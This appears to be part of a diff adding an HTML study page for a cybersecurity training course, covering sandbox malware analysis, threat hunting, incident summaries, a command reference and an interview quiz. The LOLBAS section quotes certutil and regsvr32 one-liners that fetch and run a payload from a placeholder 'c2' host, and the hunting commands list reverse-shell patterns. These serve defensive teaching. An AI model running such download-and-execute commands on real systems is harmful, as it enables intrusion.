+      <div class="concept"><div class="ctitle">Evasion Detection</div><div class="cdesc">Malware checks for sandbox artifacts: is the screen resolution 800x600? Are there VMware tools installed? Does the username match "Cuckoo"? Evasion itself is an indicator.</div></div>
+    </div>
+
+    <div class="section-label">// the real incident</div>
+    <p style="font-size:13.5px;color:#cdd6da;"><strong>Dridex Banking Trojan (2014–2023):</strong> European banking security teams used Cuckoo sandbox to analyze thousands of Dridex samples. Dynamic analysis revealed: C2 infrastructure across 300+ financial institution compromises, credential harvesting via web injects (fake banking pages injected into legitimate browser sessions), and a distributed botnet architecture that evolved over 9 years. Every C2 domain, every injected banking page, and every exfiltration endpoint was first identified through sandbox execution.</p>
+
+    <div class="section-label">// commands</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>python3 cuckoo.py submit --timeout 120 suspicious.exe</div><div class="cdesc">Submit sample to Cuckoo sandbox with 2-minute execution timeout.</div></div>
+      <div class="cmd-row"><code>inotifywait -m -r /tmp/</code><div class="cdesc">Monitor real-time file system changes in /tmp during malware execution.</div></div>
+      <div class="cmd-row"><code>tcpdump -i eth0 -n -X port 80 or port 443</code><div class="cdesc">Capture live network traffic from sandboxed VM — see C2 communication in real time.</div></div>
+      <div class="cmd-row"><code>regshot take && <malware> && regshot compare</code><div class="cdesc">Take registry snapshot before and after execution — identify persistence keys added by malware.</div></div>
+      <div class="cmd-row"><code>watch -n 1 "lsof -p $(pgrep malware_pid)"</code><div class="cdesc">Monitor file descriptors opened by malware process in real time.</div></div>
+    </div>
+
+    <div class="section-label">// interview answer</div>
+    <div class="qa">
+      <div class="q">Q: How can malware detect it's running in a sandbox and what do you do about it?</div>
+      <div class="a">Malware checks screen resolution (800x600 is common in VMs), MAC prefix (00:0C:29 = VMware), registry keys for VMware Tools, or sleeps for 10+ minutes before executing. Counter: use custom sandbox with real hardware MACs, real display drivers, and patch out sleep calls with API hooking. Also check the sample's anti-VM logic in static analysis — it tells you what to fake.</div>
+    </div>
+  </div>
+
+  <!-- DAY 70 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">70</div>
+      <div class="day-meta">
+        <div class="day-title">Threat Hunting Fundamentals</div>
+        <span class="day-incident">LOLBAS — Living Off the Land</span>
+      </div>
+    </div>
+
+    <div class="section-label">// core concepts</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">Hypothesis-Driven Hunting</div><div class="cdesc">Start with a hypothesis: "Attackers are using PowerShell to download payloads." Then search logs, network traffic, and process data for evidence. Not random searching.</div></div>
+      <div class="concept"><div class="ctitle">Pyramid of Pain</div><div class="cdesc">Hash values (easy to change) → IPs → Domain Names → Network Artifacts → Tools → TTPs (hardest). Hunting at the TTP level finds attackers even after they change infrastructure.</div></div>
+      <div class="concept"><div class="ctitle">Living Off the Land (LotL)</div><div class="cdesc">Attackers use built-in OS tools (powershell.exe, wmic.exe, certutil.exe, cscript.exe) instead of dropping custom binaries. No file to detect — the tool IS the payload.</div></div>
+      <div class="concept"><div class="ctitle">Proactive vs Reactive</div><div class="cdesc">Reactive = waiting for alerts to fire. Proactive = searching for attacker activity in absence of alerts. Most SOCs are entirely reactive; threat hunting is the differentiator.</div></div>
+    </div>
+
+    <div class="section-label">// the real incident</div>
+    <p style="font-size:13.5px;color:#cdd6da;"><strong>LOLBAS Project:</strong> The Living Off the Land Binaries, Scripts and Libraries (LOLBAS) project catalogs every Microsoft-signed binary that can be abused for malicious purposes. Examples: `certutil.exe -urlcache -f http://c2/payload.exe payload.exe` (downloads files), `wmic.exe process call create "calc.exe"` (executes code), `regsvr32.exe /s /u /i:http://c2/payload.sct scrobj.dll` (code execution via scriptlet). These are trusted, signed Microsoft tools — traditional AV whitelists them. Threat hunters specifically monitor for abnormal usage patterns of these binaries.</p>
+
+    <div class="section-label">// commands</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4688} | Where-Object {$_.Properties[5].Value -match 'certutil|wmic|regsvr32'}</code><div class="cdesc">Hunt for LotL abuse — process creation events for known LOLBAS binaries.</div></div>
+      <div class="cmd-row"><code>wevtutil qe Security /q:"*[System[EventID=4688]]" /f:text | findstr /i "certutil"</code><div class="cdesc">Query Windows Event Log for certutil.exe execution — legitimate usage is rare, abuse is common.</div></div>
+      <div class="cmd-row"><code>cat /var/log/syslog | grep -E "curl|wget|python|bash -i"</code><div class="cdesc">Hunt for reverse shell and download patterns in Linux logs.</div></div>
+    </div>
+
+    <div class="section-label">// interview answer</div>
+    <div class="qa">
+      <div class="q">Q: How do you distinguish legitimate PowerShell usage from attacker misuse?</div>
+      <div class="a">Three key indicators: (1) Source — PowerShell spawned from Office, browser, or random process vs. from legitimate admin tools. (2) Arguments — base64-encoded commands (-EncodedCommand), download strings, obfuscated script blocks. (3) Frequency — an admin runs 5 PowerShell commands per day; a compromised machine runs 500. Enable PowerShell Script Block Logging (Event ID 4104) to see every deobfuscated command.</div>
+    </div>
+  </div>
+
+  <!-- ALL REAL INCIDENTS TIMELINE -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num" style="font-size:18px;color:var(--red);">⚠</div>
+      <div class="day-meta">
+        <div class="day-title">All 10 Real Incidents — Quick Reference</div>
+        <span class="day-incident">Know these cold — they appear in every interview</span>
+      </div>
+    </div>
+    <div class="breach-timeline">
+      <div class="bt-row"><div class="year">2010</div><div class="incident">Stuxnet Discovery</div><div class="detail">Static analysis revealed stolen certs, 4 zero-days, Siemens SCADA targeting. Nation-state cyberweapon.</div></div>
+      <div class="bt-row"><div class="year">2014</div><div class="incident">Sony Pictures Breach</div><div class="detail">DPRK Lazarus Group. 100TB exfiltrated, 3000+ workstations wiped. Forensics built the timeline.</div></div>
+      <div class="bt-row"><div class="year">2014–23</div><div class="incident">Dridex Banking Trojan</div><div class="detail">300+ financial institutions compromised. Sandbox analysis identified C2 patterns and web injects.</div></div>
+      <div class="bt-row"><div class="year">2016</div><div class="incident">Bangladesh Bank Heist</div><div class="detail">Lazarus Group. $951M SWIFT fraud. Wireshark dissected fraudulent SWIFT message traffic.</div></div>
+      <div class="bt-row"><div class="year">2020</div><div class="incident">SolarWinds / APT29</div><div class="detail">15+ MITRE ATT&CK techniques mapped. Supply chain compromise. Attributed via technique overlap.</div></div>
+      <div class="bt-row"><div class="year">2021</div><div class="incident">Hafnium Exchange Zero-Days</div><div class="detail">4 Exchange CVEs exploited. CrowdStrike EDR detected w3wp.exe webshell behavior within minutes.</div></div>
+      <div class="bt-row"><div class="year">2021</div><div class="incident">Kaseya / REvil</div><div class="detail">Supply-chain ransomware to 1500+ orgs. MISP shared IoCs before many knew they were hit.</div></div>
+      <div class="bt-row"><div class="year">2021</div><div class="incident">Colonial Pipeline</div><div class="detail">DarkSide ransomware. NIST IR lifecycle followed start to finish. $4.4M ransom paid.</div></div>
+      <div class="bt-row"><div class="year">Ongoing</div><div class="incident">LOLBAS Project</div><div class="detail">Signed Microsoft binaries abused by attackers. Hunting LotL abuse is the gold standard.</div></div>
+      <div class="bt-row"><div class="year">Global</div><div class="incident">Snort IDS Deployments</div><div class="detail">5M+ downloads, 40K+ rules. #1 open-source IDS. Suricata handles 10Gbps+ line rates.</div></div>
+    </div>
+  </div>
+
+  <!-- ALL COMMANDS QUICK REF -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num" style="font-size:18px;color:var(--cyan);">&gt;_</div>
+      <div class="day-meta">
+        <div class="day-title">Master Command Reference — Days 61–70</div>
+        <span class="day-incident">Run these until they're muscle memory</span>
+      </div>
+    </div>
+    <div class="command-table">
+      <div class="cmd-row"><code>tshark -r capture.pcap -Y "http.request"</code><div class="cdesc">Filter HTTP requests in Wireshark capture.</div></div>
+      <div class="cmd-row"><code>tshark -r capture.pcap -Y "tcp.port==443" -T fields -e ip.src -e tls.handshake.ciphersuite</code><div class="cdesc">Extract TLS handshake details.</div></div>
+      <div class="cmd-row"><code>tcpdump -i eth0 -w live.pcap</code><div class="cdesc">Capture live traffic for Wireshark analysis.</div></div>
+      <div class="cmd-row"><code>snort -c snort.conf -i eth0</code><div class="cdesc">Start Snort IDS on an interface.</div></div>
+      <div class="cmd-row"><code>snort -r capture.pcap -c snort.conf</code><div class="cdesc">Test Snort rules against saved PCAP.</div></div>
+      <div class="cmd-row"><code>suricata -c suricata.yaml -i eth0</code><div class="cdesc">Start Suricata IPS/IDS.</div></div>
+      <div class="cmd-row"><code>wevtutil qe Security /q:"*[System[EventID=4688]]" /f:text</code><div class="cdesc">Query Windows process creation events.</div></div>
+      <div class="cmd-row"><code>dd if=/dev/sda of=image.dd bs=4096 conv=noerror,sync</code><div class="cdesc">Create forensic bit-for-bit disk image.</div></div>
+      <div class="cmd-row"><code>sha256sum image.dd > evidence.hash</code><div class="cdesc">Compute hash for chain of custody.</div></div>
+      <div class="cmd-row"><code>foremost -i image.dd -o /evidence/carved</code><div class="cdesc">Carve deleted files from disk image.</div></div>
+      <div class="cmd-row"><code>strings sample.exe | sort -u</code><div class="cdesc">Extract unique strings from malware binary.</div></div>
+      <div class="cmd-row"><code>python3 cuckoo.py submit suspicious.exe</code><div class="cdesc">Submit sample to Cuckoo sandbox.</div></div>
+      <div class="cmd-row"><code>Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4688} | Where-Object {$_.Properties[5].Value -match 'certutil|wmic'}</code><div class="cdesc">Hunt for LOLBAS binary abuse in Windows.</div></div>
+      <div class="cmd-row"><code>iptables -A INPUT -s [IP] -j DROP</code><div class="cdesc">Immediate containment — drop attacker IP at firewall.</div></div>
+    </div>
+  </div>
+
+  <!-- AI TOOLS ACROSS DAYS 61-70 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num" style="font-size:18px;color:var(--pink);">AI</div>
+      <div class="day-meta">
+        <div class="day-title">AI Tools Referenced — Days 61–70</div>
+        <span class="day-incident">Use these alongside your learning</span>
+      </div>
+    </div>
+    <div class="ai-grid">
+      <div class="ai-pill"><div class="aname">Wireshark + AI</div><div class="adesc">Use ChatGPT/Claude to explain suspicious packet sequences and decode obscure protocol fields.</div></div>
+      <div class="ai-pill"><div class="aname">Snort/Suricata + GPT</div><div class="cdesc">Generate Snort rule skeletons from natural language descriptions — "alert on SMBv1 exploit" becomes a rule draft.</div></div>
+      <div class="ai-pill"><div class="aname">CrowdStrike Charlotte AI</div><div class="cdesc">AI-powered EDR investigation assistant — natural language queries for threat telemetry across global endpoints.</div></div>
+      <div class="ai-pill"><div class="aname">MISP + ML</div><div class="cdesc">Machine learning correlations between IoC attributes — finds relationships human analysts miss.</div></div>
+      <div class="ai-pill"><div class="aname">Cuckoo + AI Analysis</div><div class="cdesc">LLM-generated sandbox report summaries — extract key IOCs from 200-page JSON reports in seconds.</div></div>
+      <div class="ai-pill"><div class="aname">VirusTotal + AI</div><div class="cdesc">AI-powered sample similarity search — finds related malware by behavior not just hash.</div></div>
+    </div>
+  </div>
+
+  <!-- RESUME BULLETS -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num" style="font-size:18px;color:var(--green);">💼</div>
+      <div class="day-meta">
+        <div class="day-title">Resume Bullets — Days 61–70</div>
+        <span class="day-incident">Lift these directly into your resume now</span>
+      </div>
+    </div>
+    <div class="job-grid">
+      <div class="job-box"><div class="day-ref">Day 61</div><div class="bullet">"Performed network traffic analysis with Wireshark; isolated SWIFT message traffic, reconstructed TCP streams, and extracted transferred files from PCAP captures for forensic investigation."</div></div>
+      <div class="job-box"><div class="day-ref">Day 62</div><div class="bullet">"Configured Snort and Suricata intrusion detection systems; wrote custom detection rules for C2 beaconing, port scans, and SQL injection patterns validated against known malicious PCAPs."</div></div>
+      <div class="job-box"><div class="day-ref">Day 63</div><div class="bullet">"Simulated process injection, persistence mechanisms, and LSASS dumping in lab environment; analyzed EDR telemetry patterns and alert generation for fileless attack detection."</div></div>
+      <div class="job-box"><div class="day-ref">Day 64</div><div class="bullet">"Configured MISP threat intelligence platform; consumed STIX/TAXII feeds and mapped indicators of compromise to MITRE ATT&CK techniques for operational use."</div></div>
+      <div class="job-box"><div class="day-ref">Day 65</div><div class="bullet">"Mapped the SolarWinds supply chain attack to 15+ MITRE ATT&CK techniques; performed organizational detection coverage gap analysis using ATT&CK Navigator."</div></div>
+      <div class="job-box"><div class="day-ref">Day 66</div><div class="bullet">"Applied NIST SP 800-61 incident response lifecycle in simulated ransomware scenario; executed containment, eradication, and recovery procedures with documented post-incident findings."</div></div>
+      <div class="job-box"><div class="day-ref">Day 67</div><div class="bullet">"Created forensic disk images using dd and FTK Imager; recovered deleted files via file carving; built attacker activity timeline from filesystem metadata and log correlation."</div></div>
+      <div class="job-box"><div class="day-ref">Day 68</div><div class="bullet">"Performed static malware analysis on PE binaries using pestudio and PE-bear; identified suspicious imports, embedded strings, and compile timestamps for threat classification."</div></div>
+      <div class="job-box"><div class="day-ref">Day 69</div><div class="bullet">"Executed malware samples in Cuckoo sandbox; monitored API calls, file system changes, registry modifications, and C2 network connections to extract behavioral indicators."</div></div>
+      <div class="job-box"><div class="day-ref">Day 70</div><div class="bullet">"Conducted hypothesis-driven threat hunting in Windows environments; identified Living-Off-the-Land binary abuse patterns (certutil, wmic, PowerShell) using Windows Event Log queries."</div></div>
+    </div>
+  </div>
+
+  <!-- QUICK QUIZ -->
+  <div class="quiz-section">
+    <h2>// Quick Self-Quiz — Can You Answer These Without Looking?</h2>
+    <p class="sub">Cover the answers. Say them out loud. If you can't answer one fluently, revisit that day before continuing.</p>
+
+    <div class="q-item">
+      <div class="qnum">Q01</div>
+      <div class="qtext">How did forensic analysts trace the Bangladesh Bank heist using Wireshark?</div>
+      <div class="ans">They dissected captured SWIFT message traffic by following TCP streams and filtering for SWIFT protocol patterns, reconstructing the exact sequence of fraudulent $951M transfer requests and identifying Lazarus Group C2 IPs.</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q02</div>
+      <div class="qtext">Write a basic Snort rule structure. What does each part mean?</div>
+      <div class="ans">`alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:"Example"; content:"malicious"; sid:1000001; rev:1;)` — action, protocol, source (IP+port), direction, destination (IP+port), rule body with message, content match, and unique signature ID.</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q03</div>
+      <div class="qtext">How did CrowdStrike Falcon EDR detect the Hafnium Exchange attack so quickly?</div>
+      <div class="ans">Falcon detected anomalous w3wp.exe (Exchange worker process) behavior — webshell deployment via unusual child processes (PowerShell, cmd.exe), suspicious outbound connections from the Exchange server, and file writes to the inetpub/wwwroot directory.</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q04</div>
+      <div class="qtext">What is the difference between STIX and TAXII?</div>
+      <div class="ans">STIX is the data format (JSON schema for threats, IoCs, TTPs). TAXII is the transport protocol for sharing STIX data between organizations. STIX = what you share. TAXII = how you share it.</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q05</div>
+      <div class="qtext">How many MITRE ATT&CK techniques were mapped in the SolarWinds attack chain? Name three.</div>
+      <div class="ans">15+ techniques. Examples: T1195 (Supply Chain Compromise) — infected Orion build. T1078 (Valid Accounts) — abused existing credentials. T1553 (Subvert Trust Controls) — forged code signing certificates.</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q06</div>
+      <div class="qtext">Walk through the NIST IR lifecycle. Which phase is most critical and why?</div>
+      <div class="ans">Preparation → Detection → Containment → Eradication → Recovery → Lessons Learned. Preparation is most critical because 80% of response success depends on pre-deployed logging, EDR coverage, and playbooks created before any incident occurs.</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q07</div>
+      <div class="qtext">What command creates a forensic disk image, and why is the hash important?</div>
+      <div class="ans">`dd if=/dev/sda of=image.dd bs=4096 conv=noerror,sync`. The SHA-256 hash verifies the image is identical to the original at acquisition time. Without a verifiable hash, the evidence cannot be admitted in court — the chain of custody is broken.</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q08</div>
+      <div class="qtext">What static indicators identified Stuxnet as a state-built cyberweapon?</div>
+      <div class="ans">Two stolen but legitimate digital certificates (RealTek, JMicron), four zero-day exploits, Siemens WinCC Step-7 SCADA-specific code, and strings referencing Iranian nuclear facilities. No commodity malware has that combination.</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q09</div>
+      <div class="qtext">How can malware detect it's running in a sandbox, and what's the countermeasure?</div>
+      <div class="ans">Checks: screen resolution (800x600), VMware MAC prefix (00:0C:29), registry keys for VMware Tools, long sleep calls (10+ min). Counter: use bare-metal sandboxes, patch sleep calls via API hooking, customize VM artifacts to match real enterprise configurations.</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q10</div>
+      <div class="qtext">What is the Pyramid of Pain and how does it relate to threat hunting?</div>
+      <div class="ans">Hash → IP → Domain → Network Artifact → Tools → TTPs. Lower levels are easy for attackers to change (hashes in minutes). Higher levels (TTPs) are very difficult to change. Threat hunters aim to detect TTPs so attackers cannot evade by simply replacing infrastructure.</div>
+    </div>
+  </div>
+
+  <div class="next-up">
+    <div>
+      <div class="label">// next up — day 71</div>
+      <div class="title">Security Policies & Compliance (ISO 27001, GDPR)</div>
+    </div>
+    <div class="arrow">→</div>
+  </div>
+
+  <footer>revision complete — Phase 4 solidification done. Continue to Day 71.</footer>
+
+</div>
+</body>
+</html>
